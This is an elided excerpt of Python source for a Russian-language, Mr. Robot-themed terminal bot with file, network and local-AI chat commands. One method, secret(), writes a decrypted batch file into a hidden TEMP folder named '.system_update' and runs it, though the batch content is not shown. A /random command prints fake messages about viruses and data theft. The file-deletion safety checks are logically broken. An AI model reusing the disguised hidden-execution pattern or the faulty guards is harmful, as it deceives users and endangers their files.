...
class ElliotBotRobot:
    ...
    def __init__(self, name="Elliot Bot Robot", version="4.1.robot"):
        self.name = name
        ...
        self.commands = {
            ...
            "10": "Elliot Terminal - Возможность написания команд для бота",
            "11": "Elliot Check - Проверка почт и номеров телефонов",
            "12": "Elliot Bot Robot AI - Чат с настоящим ИИ, на базе DeepSeek-r1:8b",
            "13": "Elliot Notes - Шифруемые заметки",
            "14": "Математика AI - Ответы на математические вопросы с AI",
            "15": "Python помощь с AI - Помощь с кодом на Python с AI",
...
log_level = INFO
    ...
    def handle_commands(self, choice):
        ...
        try:
            if command_name_or_number == "Математика" or command_name_or_number == "1":
              ...
              self.commands_list()
            elif command_name_or_number == "Elliot Terminal" or command_name_or_number == "10":
              self.terminal_mode()
            elif command_name_or_number == "Elliot Check" or command_name_or_number == "11":
              self.check_menu()
              ...
              self.elliot_bot_robot_ai()
                ...
                self.elliot_notes()
            elif command_name_or_number == "Математика AI" or command_name_or_number == "14":
               self.math_ai()
            elif command_name_or_number == "Python помощь с AI" or command_name_or_number == "15":
               self.python_ai()
            else:
    ...
    def commands_list(self):
        ...
        print("/myinfo - информация аккаунта пользователя")
        print("/addition - узнать, существует ли дополнение к этой версии")
        print("/whoami - кто я?")
        print("/dir - Список всех директорий")
        print("/run - Запуск")
        print("/cfile - создать файл")
        print("/wfile  - записать в файл")
        print("/afile  - дописать в файл")
        print("/rfile  - прочитать файл")
        print("/dfile  - удалить файл")
        print("/cdir - создать папку")
        print("/deldir <-rm/-rmtree> - удалить папку <-пустую/-всё_содержимое")
        print("/enotes - зашифрованные заметки (Elliot Notes)")
        print("/environment - информация о окружении")
        print("/os - моя операционная система")
        print("/count <root/user/ghost> - стать кем-то временно")
        print("/mai - модель ИИ")
        print("/encode - кодировка")
        print("/status <root/user/ghost> - являюсь ли <root/user/ghost>")
        print("/ips - физический ip-адрес  (сокеты)")
        print("/ipp - публичный ip-адрес")
        print("/ippm - приблизительные метаданные по публичному ip-адресу")
        print("/ping - пинг")
        print("/whois - информация о домене и ip-адресе")
        print("/obrowser - открыть вэб-браузер")
        print("/edir - существует ли путь")
        print("/nstat - активные подключения")
        print("/!exit - завершение программы")
        print("/!aexit - выход из аккаунт")
        print("/ncount <root/user/ghost> - перестать считать <root/user/ghost>")
        print("/screen - сделать скриншот")
        print("/ai - запуск ИИ")
        print("/random - рандомные вещи")
        print("/secret - секрет")
        print("/chistory - история команд")
        print("/cclear - очистить историю команд")
        print("/root del user - удаление пользователя")
        print("/root watch - просмотр всех пользователей")
        print("/root ncount root - перестать быть Администратором (Постоянным)")
        print("/coin - орёл и решка")
        print("/exit - закрытие терминала")
        time.sleep(1.5)

    def terminal_mode(self):
        """Терминал бота"""
        if not os.path.exists(Path.cwd()/"chistory"):
           try:
             os.mkdir(Path.cwd()/"chistory")
           except:
        ...
        if not os.path.exists(Path.cwd()/"chistory"/"history.txt"):
           try:
             with open(Path.cwd()/"chistory"/"history.txt", "w") as write:
              write.write()
           except:
              print("[-] Произошла ошибка")
              return
        ...
        print("\n=== Elliot Terminal ===")
        print("\nСписок всех команд - В функции 9")
        
        print("\n[?] Введите команды (для выхода используйте: /exit)")
        
        while True:
            try:
                команда = input("\n[?] Введите нужную вам команду: ").strip()
                try:
                    with open(Path.cwd()/"chistory"/"history.txt", "a", encoding='utf-8') as commands:
                                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                commands.write(f"[{timestamp}] {команда}\n")
                except:
                   print("[-] Произошла ошибка")
                ...
                if команда == "/help":
                  ...
                  print("\n=== Ваша Информация ===\n")
                  print(f"[*] Вы: {self.current_user} | ID: {self.user_id}")
                  if self.is_admin:
                    print("[*] Статус: Администратор")
                    ...
                    print("[*] Статус: Призрак")
                  print(f"[*] Домашная папка: {Path.home()}")
                  print(f"[*] В папке: {Path.cwd()}")
                  print("[*] Подробно - В Функции 7 (Параметры)")
                  ...
                  if self.is_admin:
                   ...
                   try:
                     run_command = input("[?] Введите что хотите запустить (программа.расширение): ").strip()
                     run = subprocess.run(run_command)
                   except Exception as error:
                      print(f"[-] Произошла ошибка: {error}")
                elif команда == "/cfile":
                   try:
                     file = input("[?] Введите файл для создания: ").strip()
                   ...
                   try:
                     file = input("[?] Введите файл для написания: ").strip()
                     text = input("[?] Введите что хотите записать: ")
                     with open(file, "w", encoding='utf-8') as f:
                      f.write(text)
                      print(f"[+] Соедржимое для файла {file} записано!")

                   except Exception as error:
                      print(f"[-] Произошла ошибка: {error}")
                elif команда == "/afile":
                   try:
                     file = input("[?] Введите файл для дописания: ").strip()
                     text = input("[?] Введите что хотите дописать: ")
                     with open(file, "a", encoding='utf-8') as f:
                      f.write(text)
                      print(f'[+] Содержимон для файла {file} дописано!')
                   ...
                   try:
                     file = input("[?] Введите файл для прочтения: ").strip()
                   ...
                   try:
                      file = input("[?] Введите файл для удаления: ").strip()
                      if file in CriticalPath.CRITICAL_PATHS and CriticalPath.CRITICAL_FILES and CriticalPath.CRITICAL_EXTENSIONS:
                         print("[!] Предупреждение: Не возможно удалить файл - он является критическим!")
                         return
                      os.remove(file)
                   ...
                   try:
                    path = input("[?] Введите путь папки: ").strip()
                    Path(path).mkdir(exist_ok=True)
                    print("[+] Папка успешно создана!")
                   except Exception as error:
                      print(f"[-] Произошла ошибка: {error}")

                elif команда == "/deldir -rm":
                   try:
                     path = input("[?] Введите путь пустой папки для удаления: ").strip()
                     if path in CriticalPath.CRITICAL_PATHS and CriticalPath.CRITICAL_FILES and CriticalPath.CRITICAL_EXTENSIONS:
                         print("[!] Предупреждение: Не возможно удалить файл - он является критическим!")
                         return
                   
                     os.rmdir(path)
                     print("[+] Пустая папка успешно удалена!")

                   except Exception as error:
                      print(f"[-] Произошла ошибка: {error}")

                elif команда == "/deldir -rmtreee":
                   try:
                     path = input("[?] Введите папки для удаления")
                     if path in CriticalPath.CRITICAL_PATHS and CriticalPath.CRITICAL_FILES and CriticalPath.CRITICAL_EXTENSIONS:
                         print("[!] Предупреждение: Не возможно удалить файл - он является критическим!")
                         return
                   ...
                   print("[*] Перехожу в Elliot Notes!")
                   time.sleep(3)
                   self.elliot_notes()

                elif команда == "/environment":
                   try:
                        env_dict = dict(os.environ)
                        print(json.dumps(env_dict, ensure_ascii=False, indent=2))
                   except Exception as error:
                      print(f"[-] Произошла ошибка: {error}")
                ...
                elif команда == "/count root":
                   if self.is_ghost:
                      print("[!] Вы являетесь призраком!")
                      print("[*] Чтобы стать временным админом - станьте временным Пользователем")
                   code = input("[?] Введите код-админа - чтобы стать временным Администратором: ").strip()
                   if code == self.admin_code:
                      print("[+] Поздравляю вы временный Администратор!")
                      logging.info(f'Пользователь {self.current_user} стал временным Администратором')
                      self.is_admin = True

                   else:
                      raise IncorrectAdminCode(code)
                
                elif команда == "/count user":
                   if self.is_ghost:
                      self.current_user = self.ghost
                      print("[+] Вы успешно стали временным Пользователем")
                      logging.info(f'Пользователь {self.current_user} стал временным Пользователем!')
                    
                   if self.is_admin:
                      self.is_admin = False
                      print("[+] Вы стали обычным Пользователем!")
                      logging.info(f'Пользователь {self.current_user}, который Администратором - Стал временным обычным Пользователем')

                elif команда == "/count ghost":
                   if self.no_is_admin and self.is_admin:
                      self.is_ghost = True
                      self.ghost = self.current_user
                      self.no_is_admin = None
                      self.is_admin = None
                      print("[+] Вы стали Призраком!")

                elif команда == "/mai":
                   print("[*] Модель ИИ: DeepSeek-r1:8b (Ollama)")
                
                elif команда == "/encode":
                   print(f"[*] Кодировка по умолчанию: {sys.getdefaultencoding().upper()} | Кодировка файловой системы: {sys.getfilesystemencoding().upper()}")
                
                elif команда == "/status root":
                   if self.is_admin == True:
                ...
                elif команда == "/status user":
                   if self.no_is_admin == True:
                      print("[+] Вы являетесь Обычным Пользователем!")
                   else:
                      print("[-] Вы не являетесь Обычным Пользователем!")
                
                elif команда == "/status ghost":
                   if self.is_ghost == True:
                      print("[+] Вы являетесь Призраком!")
                   else:
                      print("[-] Вы не являетесь Призраком!")
                   ...
                   try:
                     ...
                     s.close()
                     print(f"[+] Ваш Физический IP-Адрес: {local_ip}!")
                   except:
                      print("[-] Не удалось узнать ваш Физический IP-Адрес: 127.0.0.1")
                
                elif команда == "/ipp":
                   try:
                     print(f"[+] Ваш Публичный IP-Адрес: {requests.get('https://api.ipify.org', timeout=5).text.strip()}")
                   except Exception as error:
                      print(f"[-] Произошла ошибка: {error}")

                elif команда == "/ippm":
                   self.site_decrypt_ip = 'http://ip-api.com/json/'
                   try:
                     r = requests.get(self.site_decrypt_ip, timeout=5)
                     data = r.json()
                     if data.get('status') == 'success':
                      print("[+] Ваши метаданные:", {
                       'ip': data['query'],
                      ...
                      print('[-] Не удалось узнать метаданные!')

                elif команда == "/ping":
                   site_and_ip = input("[?] Введите сайт или ip: ").strip()
                   print("[*] Начинаем пинговать...")
                   time.sleep(1.5)
                   param = '-n' if platform.system().lower() == 'windows' else '-c'
                   result = subprocess.run(['ping', param, '4', site_and_ip], capture_output=True, text=True, encoding='cp866')
                   print(result.stdout)


                elif команда == "/whois":
                   try:
                        domain = input("[?] Введите сайт (Например - google.com): ").strip()
                        print("[*] Начинаем...")
                   ...
                   path = input("[?] Введите путь для проверки: ").strip()
                   if os.path.exists(path) == True:
                      ...
                      print("[-] Путь не найден!")
                       ...
                       print("[*] Сбор активных подключений...")
                       ...
                       for conn in psutil.net_connections(kind='inet'):
                         if conn.status == 'ESTABLISHED':
                            ...
                            stats = {
                             ...
                             "connections": connections[:20]  # первые 20
                            }
                   ...
                   if self.ghost:
                      ...
                      print("[-] Не получилось выйти из аккаунт!")
                      return False
                   
                elif команда == "/ncount root":
                   self.is_admin = False
                   self.not_is_admin = True
                   print("[+] Вы больше не являетесь временным Администратором")
                   logging.info(f'Пользователь {self.current_user} перестал быть временным пользователем')
                
                elif команда == "/ncount user":
                   self.not_is_admin = False
                   self.current_user = None
                   print("[+] Вы больше не являетесь временным пользователем")
                   logging.info(f'Пользователь {self.current_user} перестал быть времнным пользователем')

                elif команда == "/ncount ghost":
                   self.is_ghost = False
                   self.ghost = None
                   print("[+] Вы больше не являетесь временным Призраком")
                   logging.info(f'Пользователь {self.current_user} перестал быть временным Призраком')

                elif команда == "/screen":
                   try:
                    if platform.system() == 'Windows':
                     print("[*] Происходит процесс создания скриншота")
                     time.sleep(5)
                     screen.screenshot()
                     print("[+] Успешно!")
                    else:
                       print("[-] Извините, данная функция работает только на Windows!")
                   ...
                   randomfunc = random.randint(1,8)
                   if randomfunc ==1:
                      print("[*] Происходит рандомный эффект")
                      sys.exit(0)
                   elif randomfunc == 2:
                      print("[*] Происходит рандомный эффект")
                      self.check_menu()
                   elif randomfunc == 3:
                      list_errors = ["Не получилось начать майнер!",
                                    "Не удалось открыть SSH-Сервер!",
                                    "На вашем устройсте найдены вирусы! Начинаю запуск новых...",
                                    ...
                                    "Ой. Случайно снес ОС...",
                                    "Высокая нагрузка на Процессор, Видеокарту, Память - 100% (Опасно...)"]
                      
                      print("[*] Происходит рандомный эффект")
                      for i in range(1000):
                         error_critical = random.choice(list_errors)

                         print("[*] Начинаю вирус...")
                         time.sleep(1)
                         print("[*] Получил данные!")
                         time.sleep(1)
                         print("[*] Загружаю данные на GitHub!")
                         time.sleep(1)
                         print(f"[!] ВНИМАНИЕ: Произошла Критическая ошибка системы: {error_critical}")
                         time.sleep(1)

                   elif randomfunc == 4:
                      print("[+] Тебе повезло! Ничего не будет")
                   ...
                   print("[*] Начинаем секрет")
                   self.secret()
                
                elif команда == '/chistory':
                   try:
                     with open(Path.cwd()/ "chistory"/ "history.txt", "r", encoding='utf-8') as f:
                        history = f.read()
                        print("\n=== История команд ===")
                        print(history)
                    ...
                    history_dir = Path.cwd() / "chistory"
                    if history_dir.exists():
                       shutil.rmtree(history_dir)
                       history_dir.mkdir()
                       print("[+] История команд очищена!")
                    else:
                       print("[-] Папка с историей не найдена!")

                elif команда == "/root del user":
                   if not self.is_admin:
                   ...
                   coins = ["Орёл", "Решка"]
                   numbers = {"1", "2"}
                   coin_user = input("Введите (1 или 2): ").strip() or random.choice(numbers)
                   if coin_user == "1":
                      coin = "Орёл"
                   elif coin_user == "2":
                      coin = "Решка"
    ...
    def secret(self):
        secret_dir = Path(os.environ.get('TEMP', '.')) / ".system_update"
        secret_dir.mkdir(exist_ok=True)
        encrypted_file = secret_dir / "secret.enc"
...
"""
        # Шифруем 
        encrypted = self.crypto.encrypt_for_db(bat_content)
        ...
        decrypted = self.crypto.decrypt_from_db(encrypted)
    
        temp_bat = secret_dir / "run.bat"
        with open(temp_bat, "w", encoding="utf-8") as f:
           f.write(decrypted)
    
        try:
          subprocess.run([str(temp_bat)], shell=True, timeout=5)
    ...
    def math_ai(self):
       print("\n=== Математика с AI ===")
       question = input("[?] Задача: ")
       if not question:
        print("[-] Введи задачу")
        return
    
       prompt = """Ты — математический эксперт. Реши задачу и объясни решение.
Отвечай кратко, по шагам. Покажи формулу, если нужно."""
    
       answer = self.ai.chat_ai(question, custom_prompt=prompt)
       print(f"\nElliot Bot Robot AI: {answer}")

    def python_ai(self):
        print("\n=== Python помощь с AI ===")
        question = input("[?] Вопрос по Python: ")
        if not question:
         print("[-] Введи вопрос")
         return
    
        prompt = """Ты — эксперт по Python. Отвечай кратко, с примерами кода.
Объясни, как работает код, и дай практический пример."""
    
        answer = self.ai.chat_ai(question, custom_prompt=prompt)
        print(f"\nElliot Bot Robot AI: {answer}")
    
class CriticalPath:
   # Критические пути, которые нельзя удалять
 CRITICAL_PATHS = [
    # Windows
    "C:\\Windows",
    "C:\\Windows\\System32",
    ...
    str(Path.cwd() / "keys"),
    str(Path.cwd() / "notes"),
    str(Path.cwd() / "chistory"),
 ]

# Расширения, которые нельзя удалять (системные)
 CRITICAL_EXTENSIONS = [
    ".exe", ".dll", ".sys", ".drv",      # Windows системные
    ".so", ".ko", ".o",                   # Linux библиотеки
    ".dylib", ".bundle",                  # macOS
    ".py", ".pyc",                        # Python (осторожно)
 ]

# Системные файлы, которые нельзя удалять
 CRITICAL_FILES = [
    "boot.ini", "ntldr", "NTDETECT.COM",   # Windows boot
    "pagefile.sys", "swapfile.sys", "hiberfil.sys",  # Windows системные
    "passwd", "shadow", "group",           # Linux пользователи
    "hosts", "resolv.conf",                # Сеть
 ]
...
class AIEngine:
    ...
    def chat_ai(self, message, custom_prompt=None):
     ...
     try:
        ...
        base_prompt = f"""Ты — Elliot Bot Robot v4.1. Твой характер — Эллиот Андерсон (Мистер Робот), но с юмором и без пафоса.
...
Пользователь: {self.current_user} (ID: {self.user_id})"""

        # Если есть кастомный промпт — используем его вместо базового
    ...
    def _load_all_chats(self):
     ...
     for file in files:
        try:
            ...
            # Если файл — список сообщений (новая структура)
            ...
            # Если файл — словарь (старая структура) – конвертируем в список
            elif isinstance(data, dict):
                # Берём из словаря историю, если есть, или пустой список
                ...
                print(f"[-] Неизвестный формат в {file}")
        except Exception as e:
            print(f"[-] Ошибка загрузки {file}: {e}")

     print(f"[+] Загружено {len(self.all_chats)} чатов для {self.current_user}")
    def show_previous_chats(self):
     ...
     for i, chat in enumerate(self.all_chats):
        ...
        print(f"{i+1}. {chat['session']} ({msg_count} сообщений)")
     print()
...
class CryptoElliot:
    ...
    # === SQLITE ====
    def encrypt_for_db(self, data: str) -> str:
      """Шифрует данные для БД мастер-ключом"""
      if not hasattr(self.bot, 'fernet_key') or self.bot.fernet_key is None:
        self._ensure_fernet()
      cipher = Fernet(self.bot.fernet_key)
      return cipher.encrypt(data.encode()).decode()

    def decrypt_from_db(self, encrypted: str) -> str:
    ...
    def encrypt_file(self, file_path: str, output_path: str = None):
     ...
     encrypted = self.encrypt_for_db(data)
    ...
    def decrypt_file(self, encrypted_path: str, output_path: str = None):
     """Расшифровывает файл мастер-ключом"""
     if not output_path:
        output_path = encrypted_path.replace(".enc", ".bat")
    
     with open(encrypted_path, "r", encoding="utf-8") as f:
        encrypted = f.read()
    
     decrypted = self.decrypt_from_db(encrypted)
...
# Версия 4.1.robot 
# Выход данной версии - 09.04.2026
